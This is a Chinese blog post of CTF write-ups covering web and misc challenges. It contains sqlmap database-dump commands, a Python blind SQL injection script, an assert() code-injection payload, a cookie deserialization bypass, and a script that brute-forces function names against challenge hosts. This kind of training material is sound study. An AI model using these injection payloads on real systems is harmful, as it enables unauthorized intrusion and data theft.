<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="CTFs.18.7"><meta name="keywords" content="CTF,WriteUp"><meta name="author" content="J0k3r"><meta name="copyright" content="J0k3r"><title>CTFs.18.7 | J0k3r</title><link rel="shortcut icon" href="/img/fav.png"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><link rel="dns-prefetch" href="https://unpkg.com"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/gitment/style/default.min.css"><script src="https://cdn.jsdelivr.net/npm/gitment/dist/gitment.browser.min.js"></script><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01"><span class="toc-number">1.</span> <span class="toc-text">0x01</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#变量覆盖"><span class="toc-number">1.0.1.</span> <span class="toc-text">变量覆盖</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#这是一个神奇的登陆框"><span class="toc-number">1.0.2.</span> <span class="toc-text">这是一个神奇的登陆框</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Webshell分析"><span class="toc-number">1.0.3.</span> <span class="toc-text">Webshell分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Simple-Injection"><span class="toc-number">1.0.4.</span> <span class="toc-text">Simple Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyphp"><span class="toc-number">1.0.5.</span> <span class="toc-text">babyphp</span></a></li></ol></li></ol><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02"><span class="toc-number">2.</span> <span class="toc-text">0x02</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sql注入2"><span class="toc-number">2.0.1.</span> <span class="toc-text">sql注入2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag-php"><span class="toc-number">2.0.2.</span> <span class="toc-text">flag.php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP大法"><span class="toc-number">2.0.3.</span> <span class="toc-text">PHP大法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆照-08067CTF"><span class="toc-number">2.0.4.</span> <span class="toc-text">爆照(08067CTF)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#字符？正则？"><span class="toc-number">2.0.5.</span> <span class="toc-text">字符？正则？</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03"><span class="toc-number">3.</span> <span class="toc-text">0x03</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Anonymous"><span class="toc-number">3.0.1.</span> <span class="toc-text">Anonymous</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Injection"><span class="toc-number">3.0.2.</span> <span class="toc-text">SQL Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#md5-collision"><span class="toc-number">3.0.3.</span> <span class="toc-text">md5 collision</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#guess"><span class="toc-number">3.0.4.</span> <span class="toc-text">guess</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Snake"><span class="toc-number">3.0.5.</span> <span class="toc-text">Snake</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#welcome-to-bugkuctf"><span class="toc-number">3.0.6.</span> <span class="toc-text">welcome to bugkuctf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#输入密码查看flag"><span class="toc-number">3.0.7.</span> <span class="toc-text">输入密码查看flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#never-give-up"><span class="toc-number">3.0.8.</span> <span class="toc-text">never give up</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#好多压缩包"><span class="toc-number">3.0.9.</span> <span class="toc-text">好多压缩包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#图穷匕见"><span class="toc-number">3.0.10.</span> <span class="toc-text">图穷匕见</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05"><span class="toc-number">4.</span> <span class="toc-text">0x05</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#网站被黑"><span class="toc-number">4.0.1.</span> <span class="toc-text">网站被黑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#流量分析-cnss"><span class="toc-number">4.0.2.</span> <span class="toc-text">流量分析(cnss)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#简单的waf"><span class="toc-number">4.0.3.</span> <span class="toc-text">简单的waf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#kill"><span class="toc-number">4.0.4.</span> <span class="toc-text">kill</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Do-you-know-upload？"><span class="toc-number">4.0.5.</span> <span class="toc-text">Do you know upload？</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06"><span class="toc-number">5.</span> <span class="toc-text">0x06</span></a></li></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">J0k3r</div><div class="author-info__description text-center"></div><div class="follow-button"><a href="https://github.com/zhuxianjin">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">32</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">31</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">友链</div><a class="author-info-links__name text-center" href="https://p0sec.net/">p0神</a><a class="author-info-links__name text-center" href="http://seaii-blog.com/">seaii</a><a class="author-info-links__name text-center" href="http://0sec.com.cn/">everglow</a><a class="author-info-links__name text-center" href="http://mengsec.com/">MengChen</a><a class="author-info-links__name text-center" href="http://windylh.com/">Windylh</a><a class="author-info-links__name text-center" href="http://p0desta.com/">p0desta</a><a class="author-info-links__name text-center" href="http://lanvnal.com/">LANVNAL</a><a class="author-info-links__name text-center" href="https://bossgirl.github.io/">八千国家奖学金</a><a class="author-info-links__name text-center" href="http://syf.ac.cn/">7N1ght</a><a class="author-info-links__name text-center" href="http://wzt.ac.cn/">WCatalpa.T</a><a class="author-info-links__name text-center" href="https://daolgts.github.io/">daolgts</a><a class="author-info-links__name text-center" href="https://qingchenldl.github.io">V0W</a><a class="author-info-links__name text-center" href="https://fancyking.ml/">fancyking</a><a class="author-info-links__name text-center" href="http://dxxblog.top/">xx_C1</a><a class="author-info-links__name text-center" href="http://www.cooper111.xyz/">花郎世纪</a><a class="author-info-links__name text-center" href="http://asa9ao.xyz/">Asa9ao</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://i.loli.net/2019/07/31/5d41a1019cdd085371.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">J0k3r</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">主页</a><a class="site-page" href="/archives">归档</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/about/">关于</a></span></div><div id="post-info"><div id="post-title">CTFs.18.7</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-07-25</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>点击阅读</p>
<a id="more"></a>
<h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>bugku新增的一个小题</p>
<p>题目：</p>
<p><code>extract($_GET)</code>接收了GET请求中的数据，并将键名和键值转换为变量名和变量的值</p>
<p>payload：<code>http://120.24.86.145:9009/bianliang/?a=&amp;b=</code></p>
<p><code>flag{num_test_administrator}</code></p>
<h3 id="这是一个神奇的登陆框"><a href="#这是一个神奇的登陆框" class="headerlink" title="这是一个神奇的登陆框"></a>这是一个神奇的登陆框</h3><p>开始也没发现什么，就抓包用sqlmap跑了</p>
<p>跑了半天，也能跑出来</p>
<p><img src="https://i.loli.net/2018/07/29/5b5d2fcf5c7c1.png" alt="s18.png"></p>
<p><code>python sqlmap.py -r /Users/xc/Desktop/post.txt --dbs --drop-set-cookie -D bugkusql1 -T flag1 --dump</code></p>
<p>flag就是那串字符放到flag{}里</p>
<p>这个手动注入也可以，就是换成了<code>&quot;</code>，也没过滤。。。</p>
<p>最后 <code>1&quot; union select flag1,1  from flag1#</code></p>
<h3 id="Webshell分析"><a href="#Webshell分析" class="headerlink" title="Webshell分析"></a>Webshell分析</h3><p>分析文件findwebshell.pcapng</p>
<p>由webshell想到过滤一下POST</p>
<p><code>http.request.method==&quot;POST&quot;</code></p>
<p>然后搜索flag字符串，有两个结果，其中一个最后有类似base64的编码</p>
<p>解码得到图片地址</p>
<p><img src="https://i.loli.net/2018/07/29/5b5d2fcf2db89.png" alt="s19.png"></p>
<p>是个二维码，扫描得到flag</p>
<p><code>flag{1542ae716e47576e1f3e36326a23e72e}</code></p>
<h3 id="Simple-Injection"><a href="#Simple-Injection" class="headerlink" title="Simple Injection"></a>Simple Injection</h3><p>测试发现空格被过滤，用注释填充</p>
<p><code>admin&#39;/**/or/**/1=1#</code> 显示密码错误</p>
<p><code>admin&#39;/**/union/**/select/**/database()#</code> 仍显示密码错误</p>
<p>一开始sqlmap跑出injection库和admin表，password弄不出来</p>
<p>用的python脚本:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=&apos;http://web.jarvisoj.com:32787/login.php&apos;</span><br><span class="line">s = requests.Session()</span><br><span class="line">dic = &apos;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&apos;</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">for i in range(1,50):</span><br><span class="line">    for d in dic:</span><br><span class="line">        pl=&quot;admin&apos;/**/and/**/(substr((select/**/password/**/from/**/admin),%s,1)=&apos;%s&apos;)/**/and/**/&apos;1&apos;=&apos;1&quot; %(str(i),d)</span><br><span class="line">        data = &#123;&apos;username&apos;:pl,&apos;password&apos;:&apos;2333&apos;&#125;</span><br><span class="line">        r = s.post(url,data)</span><br><span class="line">        if (&apos;密码错误&apos; in r.content):</span><br><span class="line">        	flag += d</span><br><span class="line">        	print flag</span><br><span class="line">        	break</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2018/07/29/5b5d2fcf5e495.png" alt="s20.png"></p>
<p>后来发现sqlmap也是能跑出来的</p>
<p><code>python sqlmap.py  -u &quot;http://web.jarvisoj.com:32787/login.php&quot; --forms --tamper=space2comment -D injection -T admin -C id,username,password --dump</code></p>
<h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><p>首先dirb发现<code>.git</code>代码泄露，用githack扒下来源码</p>
<p>有这么一处</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&apos;page&apos;])) &#123;</span><br><span class="line">	$page = $_GET[&apos;page&apos;];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	$page = &quot;home&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$file = &quot;templates/&quot; . $page . &quot;.php&quot;;</span><br><span class="line">assert(&quot;strpos(&apos;$file&apos;, &apos;..&apos;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);</span><br><span class="line">assert(&quot;file_exists(&apos;$file&apos;)&quot;) or die(&quot;That file doesn&apos;t exist!&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>百度了解assert的代码注入</p>
<ol>
<li><p>page接收参数后组合成变量file。</p>
</li>
<li><p>file经过滤..（）防止目录遍历和判断文件是否存在</p>
</li>
<li><p>包含文件</p>
</li>
</ol>
<p>assert()简介：判断一个表达式是否成立。返回true or false。</p>
<p>当参数为字符串时，会被当作php代码执行。</p>
<p>通过可控变量file传入恶意参数，构造闭合 file_exists(),使assert()执行恶意代码</p>
<p>assert与eval</p>
<p>assert把整个字符串参数当php代码执行，eval把合法的php代码执行。</p>
<p>payload：</p>
<p><code>page=233&#39;) or print(file_get_contents(&#39;templates/flag.php&#39;));%23</code></p>
<p><code>;</code>后面加%23或//用来注释</p>
<p>flag</p>
<p><img src="https://i.loli.net/2018/07/29/5b5d2fcf2aa32.png" alt="s21.png"></p>
<h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><h3 id="sql注入2"><a href="#sql注入2" class="headerlink" title="sql注入2"></a>sql注入2</h3><p>入口：<a href="http://120.24.86.145:8007/web2/" target="_blank" rel="noopener">http://120.24.86.145:8007/web2/</a></p>
<blockquote>
<p>全都tm过滤了绝望吗？</p>
</blockquote>
<blockquote>
<p>提示 !,!=,=,+,-,^,%</p>
</blockquote>
<p>一边手动测试，一边扫目录找源代码泄露</p>
<p>找到了flag</p>
<p><img src="https://i.loli.net/2018/07/29/5b5d2efb6ac21.png" alt="s22.png"></p>
<p>没看到网上有注入的wp</p>
<p><code>flag{sql_iNJEct_comMon3600!}</code></p>
<h3 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h3><p>提示：hint</p>
<p>扫目录没发现代码泄露，提示hint不是目录，是个get参数</p>
<p>传参得到源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">include_once(&quot;flag.php&quot;); </span><br><span class="line">$cookie = $_COOKIE[&apos;ISecer&apos;]; </span><br><span class="line">if(isset($_GET[&apos;hint&apos;]))&#123; </span><br><span class="line">    show_source(__FILE__); </span><br><span class="line">&#125; </span><br><span class="line">elseif (unserialize($cookie) === &quot;$KEY&quot;) </span><br><span class="line">&#123;    </span><br><span class="line">    echo &quot;$flag&quot;; </span><br><span class="line">&#125; </span><br><span class="line">else &#123; </span><br><span class="line">?&gt; </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; </span><br><span class="line">&lt;title&gt;Login&lt;/title&gt; </span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;admin.css&quot; type=&quot;text/css&quot;&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;br&gt; </span><br><span class="line">&lt;div class=&quot;container&quot; align=&quot;center&quot;&gt; </span><br><span class="line">  &lt;form method=&quot;POST&quot; action=&quot;#&quot;&gt; </span><br><span class="line">    &lt;p&gt;&lt;input name=&quot;user&quot; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;&lt;/p&gt; </span><br><span class="line">    &lt;p&gt;&lt;input name=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;/p&gt; </span><br><span class="line">    &lt;p&gt;&lt;input value=&quot;Login&quot; type=&quot;button&quot;/&gt;&lt;/p&gt; </span><br><span class="line">  &lt;/form&gt; </span><br><span class="line">&lt;/div&gt; </span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt; </span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">&#125; </span><br><span class="line">$KEY=&apos;ISecer:www.isecer.com&apos;; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>一开始cookie里加个ISser，值为<code>serialize($KEY)</code>怎么都不行</p>
<p>看wp才发现那时候<code>$KEY</code>还是NULL</p>
<p>构造<code>ISecer=s:0:&quot;&quot;%3B</code></p>
<p><code>flag{unserialize_by_virink}</code></p>
<h3 id="PHP大法"><a href="#PHP大法" class="headerlink" title="PHP大法"></a>PHP大法</h3><p>提示index.php.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;</span><br><span class="line">  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line">if($_GET[id] == &quot;hackerDJ&quot;)</span><br><span class="line">&#123;</span><br><span class="line">  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;</span><br><span class="line">  echo &quot;&lt;p&gt;flag: *****************&#125; &lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">Can you authenticate to this website?</span><br></pre></td></tr></table></figure>
<p>传入的id要被urldecode，地址栏的输入要被encode两次</p>
<p>%加字符的16进制</p>
<p><code>?id=%2568%2561%2563%256b%2565%2572%2544%254a</code></p>
<p><code>flag: DUTCTF{PHP_is_the_best_program_language}</code></p>
<h3 id="爆照-08067CTF"><a href="#爆照-08067CTF" class="headerlink" title="爆照(08067CTF)"></a>爆照(08067CTF)</h3><p>flag格式 flag{xxx_xxx_xxx}</p>
<p><a href="http://ctf.bugku.com/files/fa88c409b367aa9243313a85d138d183/8.jpg" target="_blank" rel="noopener">图片</a></p>
<p>foremost分出zip包，被加密了</p>
<p>怀疑伪加密，修改文件头0900，解压得到8个文件</p>
<p>其中88，888，8888，三个文件头为jpg类型</p>
<p>修改后缀，88.jpg含二维码，888.jpg的hex里一段base64，foremost分离8888.jpg得到zip包，解压得到二维码</p>
<p>按顺序三个连起来就是flag</p>
<p><img src="https://i.loli.net/2018/07/29/5b5d2efb64913.png" alt="s23.png"></p>
<p><code>flag{bilibili_silisili_panama}</code></p>
<h3 id="字符？正则？"><a href="#字符？正则？" class="headerlink" title="字符？正则？"></a>字符？正则？</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">highlight_file(&apos;2.php&apos;);</span><br><span class="line">$key=&apos;KEY&#123;********************************&#125;&apos;;</span><br><span class="line">$IM= preg_match(&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match);</span><br><span class="line">if( $IM )&#123; </span><br><span class="line">  die(&apos;key is: &apos;.$key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>不是很懂php的正则</p>
<p>贴个详解</p>
<ol>
<li><p>表达式直接写出来的字符串直接利用，如key</p>
</li>
<li><p>“.”代表任意字符</p>
</li>
<li><p>“*”代表一个或一序列字符重复出现的次数，即前一个字符重复任意次</p>
</li>
<li><p>“\/”代表“/”</p>
</li>
<li><p>[a-z]代表a-z中的任意一个字符</p>
</li>
<li><p>[[:punct:]]代表任意一个字符，包括各种符号</p>
</li>
<li><p>/i代表大小写不敏感</p>
</li>
<li><p>{4-7}代表[0-9]中数字连续出现的次数是4-7次</p>
</li>
</ol>
<p>所以有很多情况</p>
<p>比如：<code>?id=key1key23333key:/3/keyy;</code></p>
<p><code>key is: KEY{0x0SIOPh550afc}</code></p>
<h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><h3 id="Anonymous"><a href="#Anonymous" class="headerlink" title="Anonymous"></a>Anonymous</h3><p>这个很久之前就看过，没头绪</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$MY = create_function(&quot;&quot;,&quot;die(`cat flag.php`);&quot;);</span><br><span class="line">$hash = bin2hex(openssl_random_pseudo_bytes(32));</span><br><span class="line">eval(&quot;function SUCTF_$hash()&#123;&quot;</span><br><span class="line">    .&quot;global \$MY;&quot;</span><br><span class="line">    .&quot;\$MY();&quot;</span><br><span class="line">    .&quot;&#125;&quot;);</span><br><span class="line">if(isset($_GET[&apos;func_name&apos;]))&#123;</span><br><span class="line">    $_GET[&quot;func_name&quot;]();</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">show_source(__FILE__);</span><br></pre></td></tr></table></figure>
<p>也很简单，传入<code>unc_name</code>,执行<code>create_function</code>创建的函数</p>
<p>就是不知道函数名</p>
<p>题目是应该是源自HITCON 2017 Baby^h-master-php的后部分</p>
<p><a href="https://xz.aliyun.com/t/1773/" target="_blank" rel="noopener">https://xz.aliyun.com/t/1773/</a></p>
<p>创建的匿名函数是有名字的,格式是<code>%00lambda_%d</code>,<code>%d</code>是数字</p>
<blockquote>
<p>其中的%d会从1一直进行递增,表示这是当前进程中第几个匿名函数.因此如果开启一个新的php进程,那么这个匿名函数就是\x00lambda_1,所以思路就是通过向Pre-fork模式的apache服务器发送大量请求,致使apache开启新的进程来处理请求,那么luck=%00lambda_1就可以执行函数了</p>
</blockquote>
<p>我还是觉得简单粗暴点好理解</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#coding: utf-8</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">for i in range(1,10000):</span><br><span class="line">        url = &apos;http://45.76.173.177:23334/?func_name=%00lambda_&apos;+str(i)</span><br><span class="line">        c = s.get(url).text</span><br><span class="line">        if &apos;flag&apos; in c:</span><br><span class="line">                print(c)</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2018/07/29/5b5d2efb6906a.png" alt="s24.png"></p>
<p>跑出来的时候差点忘了是哪个题</p>
<h3 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#GOAL: login as admin,then get the flag;</span><br><span class="line">error_reporting(0);</span><br><span class="line">require &apos;db.inc.php&apos;;</span><br><span class="line"></span><br><span class="line">function clean($str)&#123;</span><br><span class="line">	if(get_magic_quotes_gpc())&#123;</span><br><span class="line">		$str=stripslashes($str);</span><br><span class="line">	&#125;</span><br><span class="line">	return htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = @clean((string)$_GET[&apos;username&apos;]);</span><br><span class="line">$password = @clean((string)$_GET[&apos;password&apos;]);</span><br><span class="line"></span><br><span class="line">$query=&apos;SELECT * FROM users WHERE name=\&apos;&apos;.$username.&apos;\&apos; AND pass=\&apos;&apos;.$password.&apos;\&apos;;&apos;;</span><br><span class="line">$result=mysql_query($query);</span><br><span class="line">if(!$result || mysql_num_rows($result) &lt; 1)&#123;</span><br><span class="line">	die(&apos;Invalid password!&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo $flag;</span><br></pre></td></tr></table></figure>
<p>首先</p>
<p>htmlentities() 函数把字符转换为 HTML 实体</p>
<p>ENT_QUOTES - 编码双引号和单引号</p>
<p>我还傻傻用了半天单引号</p>
<p>payload: <code>?username=1\&amp;password=or%201=1%23</code></p>
<p>语句就是：</p>
<p><code>SELECT * FROM users WHERE name=&#39;1\&#39; AND pass=&#39;or 1=1#&#39;;</code></p>
<p>相当于<code>SELECT * FROM users WHERE name=&#39;xxx&#39;or 1=1#&#39;;</code></p>
<p><code>nctf{sql_injection_is_interesting}</code></p>
<h3 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h3><p>please input a</p>
<p>根据题目，随便0e开头的md5的字符串</p>
<p>paylaod: <code>?a=s878926199a</code></p>
<p><code>flag{md5_collision_is_easy}</code></p>
<h3 id="guess"><a href="#guess" class="headerlink" title="guess"></a>guess</h3><p><a href="http://ctf5.shiyanbar.com/misc/angrybird.jpg" target="_blank" rel="noopener">解题链接： http://ctf5.shiyanbar.com/misc/angrybird.jpg</a></p>
<p>用outguess这个工具才能得到flag</p>
<p>win下exe安装失败</p>
<p>下载源码，编译</p>
<p>附上下载链接<a href="https://codeload.github.com/crorvick/outguess/zip/master" target="_blank" rel="noopener">https://codeload.github.com/crorvick/outguess/zip/master</a></p>
<p>解密: </p>
<p><code>outguess -r angrybird.jpg x.txt</code></p>
<p><code>flag{0ut_Gas}</code></p>
<h3 id="Snake"><a href="#Snake" class="headerlink" title="Snake"></a>Snake</h3><p><a href="解题链接： http://ctf5.shiyanbar.com/misc/snake.jpg">解题链接： http://ctf5.shiyanbar.com/misc/snake.jpg</a></p>
<p>binwalk分析，foremost分离</p>
<p>zip包中含有cipher和key文件，key经base64解码为</p>
<p>What is Nicki Minaj’s favorite song that refers to snakes?</p>
<p>Nicki Minaj有首叫anaconda的歌，和snake有点关系</p>
<p>不过没想到要用serpent解密，serpent也有蛇的意思</p>
<p><a href="http://serpent.online-domain-tools.com/" target="_blank" rel="noopener">http://serpent.online-domain-tools.com/</a></p>
<p>类似的加密：</p>
<p><img src="https://i.loli.net/2018/07/29/5b5d2efb6610c.png" alt="s262.png"></p>
<p>anaconda就是key了</p>
<p><img src="https://i.loli.net/2018/07/29/5b5d2efb3696e.png" alt="s25.png"></p>
<p><code>CTF{who_knew_serpent_cipher_existed}</code></p>
<p>#0x04</p>
